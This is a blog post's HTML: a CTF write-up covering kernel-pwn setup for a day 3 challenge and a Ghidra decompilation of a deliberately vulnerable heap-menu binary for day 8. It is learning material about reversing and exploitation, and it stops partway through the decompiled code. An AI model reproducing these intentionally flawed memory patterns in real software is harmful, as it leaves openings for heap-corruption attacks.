@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+  </script>
+<script type="text/javascript">
+window.MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']]
+  },
+  chtml: {
+    scale: 1.10   /* Increase font size: 1.0 = default, 1.5 = 150% */
+  }
+};
+</script>
+  <title>hex-advent star labs (selected days)</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="hex-advent star labs (selected days)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="recommended listening is magic i want u by jane remover." />
+<meta property="og:description" content="recommended listening is magic i want u by jane remover." />
+<link rel="canonical" href="http://localhost:4000/2025/11/20/hex-advent.html" />
+<meta property="og:url" content="http://localhost:4000/2025/11/20/hex-advent.html" />
+<meta property="og:site_name" content="wrenches" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-11-20T05:40:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="hex-advent star labs (selected days)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-11-20T05:40:00+08:00","datePublished":"2025-11-20T05:40:00+08:00","description":"recommended listening is magic i want u by jane remover.","headline":"hex-advent star labs (selected days)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2025/11/20/hex-advent.html"},"url":"http://localhost:4000/2025/11/20/hex-advent.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="wrenches" /><link rel="shortcut icon" type="image/x-icon" href="" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+
+</head>
+<body a="dark">
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/"></a><article>
+  <p class="post-meta">
+    <time datetime="2025-11-20 05:40:00 +0800">2025-11-20 05:40:00 +0800</time>
+  </p>
+  
+  <h1>hex-advent star labs (selected days)</h1>
+
+  <p>recommended listening is <a href="https://www.youtube.com/watch?v=BPNT7NzV53Y">magic i want u</a> by jane remover.</p>
+
+<p><img src="https://i.imgur.com/V5Nxhf0.png" alt="banner" /></p>
+
+<p>the dear folks over at starlabs organized a 30-day long ctf by women, for women, and i participated and had a lot of fun. the challenges were released over the first 12 days of the month. here are some writeups for select challenges that i found interesting.</p>
+
+<h2 id="day-3-pwnmake-a-wish">day 3: pwn/make a wish</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Make a wish and your dreams will come true!
+
+Guide: https://kaligulaarmblessed.github.io/challenges/hexadvent-makeawish/
+
+Difficulty: Easy
+
+Challenge Author: Kaligula
+</code></pre></div></div>
+
+<p><em>time taken: 9 hours</em></p>
+
+<p>todo …</p>
+
+<p>in a move i can only describe as ‘extremely fucking funny’ the 3rd ‘easy’ challenge was sourceless kernel pwn. gotta hand it to kaligula, incredible bit. i’d consider myself relatively familiar with userland pwn (i’m definitely not <em>good</em> by any means), but kernel pwn is a whole nother beast. i will walk through the process step by step, from setting up your system to submitting the solution.</p>
+
+<h3 id="step-0-actually-getting-started">step 0: actually getting started</h3>
+
+<p>unzipping the dist provided, we get a handful of files.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>rlabs/writeups/day-3/dist<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">ls</span> <span class="nt">-alps</span>
+total 17412
+    4 drwxr-xr-x 2 navi navi     4096 Nov  6 13:07 ./
+    4 drwxrwxr-x 3 navi navi     4096 Dec 15 18:52 ../
+13492 <span class="nt">-rw-r--r--</span> 1 navi navi 13812736 Nov  6 13:07 bzImage
+  144 <span class="nt">-rw-r--r--</span> 1 navi navi   145495 Nov  6 13:07 config
+    4 <span class="nt">-rw-r--r--</span> 1 navi navi       18 Nov  6 13:07 flag.txt
+ 3748 <span class="nt">-rw-r--r--</span> 1 navi navi  3836004 Nov  6 13:07 initramfs.cpio.gz
+   12 <span class="nt">-rw-r--r--</span> 1 navi navi    11136 Nov  6 13:07 makeawish.ko
+    4 <span class="nt">-rw-r--r--</span> 1 navi navi      273 Nov  6 13:07 run.sh
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">bzImage</code> is the kernel image - it’s a stripped, compressed Linux executable. to facilitate debugging, we use <a href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a>, which converts this kernel image into an unstripped executable we can attach our debugger to.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="err">@</span><span class="n">curette</span> <span class="p">(</span><span class="n">rlabs</span><span class="o">/</span><span class="n">writeups</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">3</span><span class="o">/</span><span class="n">dist</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">vmlinux</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">elf</span> <span class="n">bzImage</span> <span class="n">vmlinux</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Kernel</span> <span class="n">successfully</span> <span class="n">decompressed</span> <span class="n">in</span><span class="o">-</span><span class="n">memory</span> <span class="p">(</span><span class="n">the</span> <span class="n">offsets</span> <span class="n">that</span> <span class="n">follow</span> <span class="n">will</span> <span class="n">be</span> <span class="n">given</span> <span class="n">relative</span> <span class="n">to</span> <span class="n">the</span> <span class="n">decompressed</span> <span class="n">binary</span><span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Version</span> <span class="n">string</span><span class="o">:</span> <span class="n">Linux</span> <span class="n">version</span> <span class="mi">6</span><span class="p">.</span><span class="mi">17</span><span class="p">.</span><span class="mi">6</span> <span class="p">(</span><span class="n">kaligula</span><span class="err">@</span><span class="n">cat</span><span class="p">)</span> <span class="p">(</span><span class="n">gcc</span> <span class="p">(</span><span class="n">Debian</span> <span class="mi">14</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">19</span><span class="p">)</span> <span class="mi">14</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">GNU</span> <span class="n">ld</span> <span class="p">(</span><span class="n">GNU</span> <span class="n">Binutils</span> <span class="k">for</span> <span class="n">Debian</span><span class="p">)</span> <span class="mi">2</span><span class="p">.</span><span class="mi">45</span><span class="p">)</span> <span class="err">#</span> <span class="n">SMP</span> <span class="n">PREEMPT_DYNAMIC</span> 
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Guessed</span> <span class="n">architecture</span><span class="o">:</span> <span class="n">x86_64</span> <span class="n">successfully</span> <span class="n">in</span> <span class="mi">1</span><span class="p">.</span><span class="mo">01</span> <span class="n">seconds</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">kallsyms_token_table</span> <span class="n">at</span> <span class="n">file</span> <span class="n">offset</span> <span class="mh">0x019fc4c0</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">kallsyms_token_index</span> <span class="n">at</span> <span class="n">file</span> <span class="n">offset</span> <span class="mh">0x019fc848</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">kallsyms_markers</span> <span class="n">at</span> <span class="n">file</span> <span class="n">offset</span> <span class="mh">0x019fb988</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">kallsyms_names</span> <span class="n">at</span> <span class="n">file</span> <span class="n">offset</span> <span class="mh">0x01786668</span> <span class="p">(</span><span class="mi">183660</span> <span class="n">symbols</span><span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">kallsyms_num_syms</span> <span class="n">at</span> <span class="n">file</span> <span class="n">offset</span> <span class="mh">0x01786660</span>
+<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">WARNING</span><span class="o">:</span> <span class="n">Less</span> <span class="n">than</span> <span class="n">half</span> <span class="p">(</span><span class="mi">0</span><span class="o">%</span><span class="p">)</span> <span class="n">of</span> <span class="n">offsets</span> <span class="n">are</span> <span class="n">negative</span>
+             <span class="n">You</span> <span class="n">may</span> <span class="n">want</span> <span class="n">to</span> <span class="n">re</span><span class="o">-</span><span class="n">run</span> <span class="n">this</span> <span class="n">utility</span><span class="p">,</span> <span class="n">overriding</span> <span class="n">the</span> <span class="n">relative</span> <span class="n">base</span>
+<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">WARNING</span><span class="o">:</span> <span class="n">More</span> <span class="n">than</span> <span class="n">half</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span><span class="p">)</span> <span class="n">of</span> <span class="n">offsets</span> <span class="n">look</span> <span class="n">like</span> <span class="n">absolute</span> <span class="n">addresses</span>
+<span class="p">[</span><span class="o">!</span><span class="p">]</span>          <span class="n">You</span> <span class="n">may</span> <span class="n">want</span> <span class="n">to</span> <span class="n">re</span><span class="o">-</span><span class="n">run</span> <span class="n">this</span> <span class="n">utility</span><span class="p">,</span> <span class="n">overriding</span> <span class="n">the</span> <span class="n">relative</span> <span class="n">base</span>
+<span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="n">Note</span><span class="o">:</span> <span class="n">sometimes</span> <span class="n">there</span> <span class="n">is</span> <span class="n">junk</span> <span class="n">at</span> <span class="n">the</span> <span class="n">beginning</span> <span class="n">of</span> <span class="n">the</span> <span class="n">kernel</span><span class="p">,</span> <span class="n">and</span> <span class="n">the</span> <span class="n">load</span> <span class="n">address</span> <span class="n">is</span> <span class="n">not</span> <span class="n">the</span> <span class="n">guessed</span>
+          <span class="n">base</span> <span class="n">address</span><span class="p">.</span> <span class="n">You</span> <span class="n">may</span> <span class="n">need</span> <span class="n">to</span> <span class="n">play</span> <span class="n">around</span> <span class="n">with</span> <span class="n">different</span> <span class="n">load</span> <span class="n">addresses</span> <span class="n">to</span> <span class="n">get</span> <span class="n">everything</span>
+          <span class="n">to</span> <span class="n">line</span> <span class="n">up</span><span class="p">.</span> <span class="n">There</span> <span class="n">may</span> <span class="n">be</span> <span class="n">some</span> <span class="n">decent</span> <span class="n">tables</span> <span class="n">in</span> <span class="n">the</span> <span class="n">kernel</span> <span class="n">with</span> <span class="n">known</span> <span class="n">patterns</span> <span class="n">that</span> <span class="n">could</span> <span class="n">be</span>
+          <span class="n">used</span> <span class="n">to</span> <span class="n">line</span> <span class="n">things</span> <span class="n">up</span> <span class="n">heuristically</span><span class="p">,</span> <span class="n">but</span> <span class="n">this</span> <span class="n">has</span> <span class="n">not</span> <span class="n">been</span> <span class="n">explored</span> <span class="n">this</span> <span class="n">yet</span><span class="p">.</span>
+<span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="n">Negative</span> <span class="n">offsets</span> <span class="n">overall</span><span class="o">:</span> <span class="mi">0</span> <span class="o">%</span>
+<span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="n">Null</span> <span class="n">addresses</span> <span class="n">overall</span><span class="o">:</span> <span class="mi">0</span> <span class="o">%</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="n">kallsyms_offsets</span> <span class="n">at</span> <span class="n">file</span> <span class="n">offset</span> <span class="mh">0x019fca48</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">wrote</span> <span class="n">the</span> <span class="n">new</span> <span class="n">ELF</span> <span class="n">kernel</span> <span class="n">to</span> <span class="n">vmlinux</span>
+</code></pre></div></div>
+
+<h3 id="day-8-pwnho-ho-heap">day 8: pwn/ho ho heap</h3>
+
+<p>the binary is given without source and with symbols stripped.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="err">@</span><span class="n">curette</span> <span class="p">(</span><span class="o">-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">8</span><span class="o">/</span><span class="n">dist</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">file</span> <span class="n">hohoheap</span>               
+<span class="n">hohoheap</span><span class="o">:</span> 
+<span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">pie</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="n">a4200afa6e30d02bea1fd61f9d870cad55a679e3</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mi">3</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">stripped</span>
+</code></pre></div></div>
+
+<p>i used IDA Pro to write this writeup, but in case you are using Ghidra, here is how you recover the <code class="language-plaintext highlighter-rouge">main</code> function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">processEntry</span> <span class="nf">entry</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">undefined1</span> <span class="n">auStack_8</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+  
+  <span class="n">__libc_start_main</span><span class="p">(</span><span class="n">FUN_00101340</span><span class="p">,</span>
+                    <span class="n">param_2</span><span class="p">,</span>
+                    <span class="o">&amp;</span><span class="n">stack0x00000008</span><span class="p">,</span>
+                    <span class="mi">0</span><span class="p">,</span>
+                    <span class="mi">0</span><span class="p">,</span>
+                    <span class="n">param_1</span><span class="p">,</span><span class="n">auStack_8</span><span class="p">);</span>
+  <span class="k">do</span> <span class="p">{</span>
+  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>here, the first parameter in <code class="language-plaintext highlighter-rouge">__libc_start_main</code> is our <code class="language-plaintext highlighter-rouge">main</code> function, but since it’s stripped, Ghidra doesn’t know it actually is the <code class="language-plaintext highlighter-rouge">main</code> function.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* WARNING: Type propagation algorithm not settling */</span>
+
+<span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">local_3c</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">local_38</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">local_30</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">local_18</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">local_38</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_28</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">local_18</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+  <span class="n">FUN_00101249</span><span class="p">();</span>
+  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+          <span class="n">local_38</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="n">local_28</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="n">local_18</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+          <span class="n">FUN_001012ae</span><span class="p">();</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">);</span>
+          <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020ed</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">);</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Gift index: "</span><span class="p">);</span>
+            <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020ed</span><span class="p">,</span><span class="n">local_28</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">DAT_00105060</span><span class="p">)</span> <span class="p">{</span>
+              <span class="n">local_18</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+              <span class="k">if</span> <span class="p">(</span><span class="n">local_18</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Gift does not exist"</span><span class="p">);</span>
+              <span class="p">}</span>
+              <span class="k">else</span> <span class="p">{</span>
+                <span class="n">local_30</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104c60</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span><span class="p">);</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Gift content: "</span><span class="p">);</span>
+                <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">local_18</span><span class="p">,</span><span class="n">local_30</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">);</span>
+              <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="p">{</span>
+              <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid index"</span><span class="p">);</span>
+            <span class="p">}</span>
+          <span class="p">}</span>
+          <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Gift index: "</span><span class="p">);</span>
+            <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020ed</span><span class="p">,</span><span class="n">local_28</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">DAT_00105060</span><span class="p">)</span> <span class="p">{</span>
+              <span class="n">local_18</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+              <span class="k">if</span> <span class="p">(</span><span class="n">local_18</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Gift does not exist"</span><span class="p">);</span>
+              <span class="p">}</span>
+              <span class="k">else</span> <span class="p">{</span>
+                <span class="n">local_30</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104c60</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span><span class="p">);</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>
+                <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_18</span><span class="p">,</span><span class="n">local_30</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">);</span>
+              <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="p">{</span>
+              <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid index"</span><span class="p">);</span>
+            <span class="p">}</span>
+          <span class="p">}</span>
+          <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Gift index: "</span><span class="p">);</span>
+            <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020ed</span><span class="p">,</span><span class="n">local_28</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">DAT_00105060</span><span class="p">)</span> <span class="p">{</span>
+              <span class="n">local_18</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+              <span class="k">if</span> <span class="p">((</span><span class="n">local_18</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104860</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Unable to remove gift"</span><span class="p">);</span>
+              <span class="p">}</span>
+              <span class="k">else</span> <span class="p">{</span>
+                <span class="n">free</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
+                <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104c60</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104860</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Success!"</span><span class="p">);</span>
+              <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="p">{</span>
+              <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid index"</span><span class="p">);</span>
+            <span class="p">}</span>
+          <span class="p">}</span>
+          <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Gift index: "</span><span class="p">);</span>
+            <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020ed</span><span class="p">,</span><span class="n">local_28</span><span class="p">);</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"How many gifts to give: "</span><span class="p">);</span>
+            <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020ed</span><span class="p">,</span><span class="n">local_28</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">DAT_00105060</span><span class="p">)</span> <span class="p">{</span>
+              <span class="n">local_18</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+              <span class="k">if</span> <span class="p">(</span><span class="n">local_18</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"Gift does not exist"</span><span class="p">);</span>
+              <span class="p">}</span>
+              <span class="k">else</span> <span class="p">{</span>
+                <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104860</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span>
+                     <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_28</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104860</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span><span class="p">);</span>
